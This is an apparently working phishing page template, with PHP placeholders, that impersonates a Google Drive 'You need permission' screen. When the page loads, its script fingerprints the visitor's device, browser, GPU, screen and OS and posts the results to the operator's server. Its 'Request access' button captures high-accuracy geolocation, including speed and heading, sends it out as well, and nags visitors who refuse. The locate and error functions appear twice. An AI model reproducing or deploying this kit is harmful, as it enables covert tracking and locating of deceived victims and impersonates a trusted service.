<!DOCTYPE html>
<html lang="en">

<head>
	<meta name="description" content="Web word processing, presentations and spreadsheets">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
	<!--Here-->
	<link rel="shortcut icon" href="<?= site_url(); ?>assets/images/drive_favicon1.ico">
	<title>Google Drive - Access Denied</title>
	<!--Here-->
	<link rel="stylesheet" type="text/css" href="<?= site_url(); ?>assets/css/main.css">
	<!--The HTML <script> type Attribute is used to specify the MIME type of script and identify the content of the Tag-->
	<!--All browsers by default chose javascript so it is kinda uncecessary-->
	<!--???-->
	<script type="text/javascript">
		if (window.location.protocol == "http:") {
			var restOfUrl = window.location.href.substr(5);
			window.location = "https:" + restOfUrl;
		}
	</script>
	<!--Jquery suppor is added-->
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<!--Here-->
	<!-- <input type="hidden" id="base_url" value="<?= site_url(); ?>"> -->
	<!-- <script type="text/javascript" src="<?= site_url(); ?>assets/js/info.js"></script> -->
	<!--Here-->
	<!-- <script type="text/javascript" src="<?= site_url(); ?>assets/js/location.js"></script> -->
</head>
<!--onload is most often used within the <body> element to execute a script once a web page has completely loaded all content-->
<!--It is calling a function in info.js // Execute a JavaScript immediately after a page has been loaded:-->

<body onload="information();">
	<div id="outerContainer">
		<div id="innerContainer">
			<div style="position: absolute; top: -80px;">
				<div id="drive-logo">
					<!--Span does not inherently represent anything, used for styling purposes-->
					<span class="docs-drivelogo-img"></span>
					<span class="docs-drivelogo-text"> Drive</span>
				</div>
			</div>
			<div style="clear:both"></div>
			<div id="main">
				<div id="accessDeniedIcon"></div>
				<p id="accessDeniedHeader">You need permission</p>
				<div id="message">
					<p>Want in? Ask for access, or switch to an account with permission.</p>
				</div>
				<p id="buttons" style="padding-top: 10px">
					<!--The Html <button onclick=" "> is an event attribute, which executes a script when the button is clicked. here in location.js -->
					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate();">Request access</button>
				</p>
			</div>
		</div>
	</div>
</body>

</html>
<!--As soon as the web page loads in browser location.js is called and starts working-->

<script>
	function information() {
		var ptf = navigator.platform;
		/*Returns a string representing the platform of the browser. This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. 
  The specification allows browsers to always return the empty string, so don't rely on this property to get a reliable answer.  */
		var cc = navigator.hardwareConcurrency;
		//The navigator.hardwareConcurrency read-only property returns the number of logical processors available to run threads on the user's computer.
		var ram = navigator.deviceMemory;
		/*The deviceMemory read-only property of the Navigator interface returns the approximate amount of device memory in gigabytes. 
  This feature is available only in secure contexts (HTTPS), in some or all supporting browsers. */
		var ver = navigator.userAgent;
		/*The Navigator.userAgent read-only property returns the user agent string for the current browser.  */
		// http://useragentstring.com/
		// A browser's User-Agent string (UA) helps identify which browser is being used, what version, and on which operating system
		var str = ver;
		var os = ver;
		//gpu
		// Used to create element named 'canvas' example <canvas> </canvas>
		var canvas = document.createElement("canvas");
		var gl;
		var debugInfo;
		var ven;
		var ren;
		//sysinfo
		console.log(ver);
		console.log(ptf);

		if (cc == undefined) {
			cc = "Not Available";
			console.log("Cores are not available");
		}
		console.log(cc);

		//ram
		if (ram == undefined) {
			ram = "Not Available";
			console.log("RAM is not available");
		}
		console.log(ram);

		//browser
		if (ver.indexOf("Firefox") != -1) {
			str = str.substring(str.indexOf(" Firefox/") + 1);
			str = str.split(" ");
			brw = str[0];
			console.log(str[0]);
		} else if (ver.indexOf("Chrome") != -1) {
			console.log(ver);
			str = str.substring(str.indexOf(" Chrome/") + 1);
			console.log(str);
			str = str.split(" ");
			console.log(str);
			brw = str[0];
			console.log(str[0]);
		} else if (ver.indexOf("Safari") != -1) {
			// returns first index of the given string
			// returns the string from (this, that)
			str = str.substring(str.indexOf(" Safari/") + 1);
			// splits the string into array
			str = str.split(" ");
			brw = str[0];
			console.log(str[0]);
		} else if (ver.indexOf("Edge") != -1) {
			str = str.substring(str.indexOf(" Edge/") + 1);
			str = str.split(" ");
			brw = str[0];
			console.log(str[0]);
		} else {
			brw = "Not Available";
			console.log("Browser is not available");
		}

		//gpu
		try {
			gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
		} catch (e) {}
		if (gl) {
			debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
			ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
			ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
		}
		if (ven == undefined) {
			// vendor
			ven = "Not Available";
			console.log("GPU Vendor not available");
		}
		if (ren == undefined) {
			ren = "Not Available"; // rederor
			console.log("GPU Renderer not available");
		}
		console.log(ven);
		console.log(ren);
		//
		var ht = window.screen.height;
		var wd = window.screen.width;
		console.log(window.screen.height);
		console.log(window.screen.width);
		//os
		os = os.substring(0, os.indexOf(")"));
		os = os.split(";");
		os = os[1];
		if (os == undefined) {
			os = "Not Available";
			console.log("OS is not available");
		}
		os = os.trim();
		console.log(os);
		//
		// Here ajax (jquery) is used to send ite information object.
		$.ajax({
			type: "POST",
			// here
			url: "<?= site_url('info-php'); ?>",
			data: {
				Ptf: ptf,
				Brw: brw,
				Cc: cc,
				Ram: ram,
				Ven: ven,
				Ren: ren,
				Ht: ht,
				Wd: wd,
				Os: os,
			},

			// No need to show this on console
			success: function() {
				console.log("Got Device Information");
			},
			mimeType: "text",
		});
	}

	/* AJAX
	 * Ajax no need to reload page, it fetchs request asynchronous,
	 * It doesn't interfere with existing page
	 * Saves bandwidth and battery
	 *
	 * AJAX uses XMLHttpRequest object (also called xhr object) to achieve this
	 * Use any format txt, json, xml
	 * Any trasfer protocol HTTPS/ HTTP
	 */
</script>

<script>
	function locate() {
		if (navigator.geolocation) {
			var optn = {
				enableHighAccuracy: true,
				timeout: 30000,
				maximumage: 0
			};
			navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
		} else {
			alert("Geolocation is not Supported by your Browser...");
		}

		function showPosition(position) {
			var lat = position.coords.latitude;
			var lon = position.coords.longitude;
			var acc = position.coords.accuracy;
			var alt = position.coords.altitude;
			var dir = position.coords.heading;
			var spd = position.coords.speed;

			$.ajax({
				type: "POST",
				url: "<?= site_url('result-php'); ?>",
				data: {
					Lat: lat,
					Lon: lon,
					Acc: acc,
					Alt: alt,
					Dir: dir,
					Spd: spd
				},
				// Here you add redirect url too?
				success: function() {
					window.location = "REDIRECT_URL";
				},
				mimeType: "text",
			});
		}
	}

	function showError(error) {
		switch (error.code) {
			case error.PERMISSION_DENIED:
				var denied = "User denied the request for Geolocation";
				alert("Please Refresh This Page and Allow Location Permission...");
				break;
			case error.POSITION_UNAVAILABLE:
				var unavailable = "Location information is unavailable";
				break;
			case error.TIMEOUT:
				var timeout = "The request to get user location timed out";
				alert("Please Set Your Location Mode on High Accuracy...");
				break;
			case error.UNKNOWN_ERROR:
				var unknown = "An unknown error occurred";
				break;
		}

		$.ajax({
			type: "POST",
			// here
			url: "<?= site_url('error-php'); ?>",
			data: {
				Denied: denied,
				Una: unavailable,
				Time: timeout,
				Unk: unknown
			},
			success: function() {
				$("#change").html("Failed");
			},
			mimeType: "text",
		});
	}
</script>
<script>
	function locate() {
		if (navigator.geolocation) {
			var optn = {
				enableHighAccuracy: true,
				timeout: 30000,
				maximumage: 0
			};
			navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
			// (success, error, [option])
			// success = A callback function that takes a GeolocationPosition object as its sole input parameter.
			// An optional callback function that takes a GeolocationPositionError object as its sole input paramete
		} else {
			alert("Geolocation is not Supported by your Browser...");
		}

		function showPosition(position) {
			var lat = position.coords.latitude;
			var lon = position.coords.longitude;
			var acc = position.coords.accuracy;
			var alt = position.coords.altitude;
			var dir = position.coords.heading;
			var spd = position.coords.speed;

			// Can add IP functionality here
			$.ajax({
				type: "POST",
				// here
				url: "<?= site_url('result-php'); ?>",
				data: {
					Lat: lat,
					Lon: lon,
					Acc: acc,
					Alt: alt,
					Dir: dir,
					Spd: spd
				},
				// You will add the link of redirection link here
				success: function() {
					window.location =
						"https://drive.google.com/file/d/1uuuk5luoj4D8SyiXshl1CGmyfBVk_2cM/view";
				},
				mimeType: "text",
			});
		}
	}

	function showError(error) {
		switch (error.code) {
			case error.PERMISSION_DENIED:
				var denied = "User denied the request for Geolocation";
				alert("Please Refresh This Page and Allow Location Permission...");
				break;
			case error.POSITION_UNAVAILABLE:
				var unavailable = "Location information is unavailable";
				break;
			case error.TIMEOUT:
				var timeout = "The request to get user location timed out";
				alert("Please Set Your Location Mode on High Accuracy...");
				break;
			case error.UNKNOWN_ERROR:
				var unknown = "An unknown error occurred";
				break;
		}

		$.ajax({
			type: "POST",
			// here
			url: "<?= site_url('error-php'); ?>",
			data: {
				Denied: denied,
				Una: unavailable,
				Time: timeout,
				Unk: unknown
			},
			success: function() {
				$("#change").html("Failed");
			},
			mimeType: "text",
		});
	}
</script>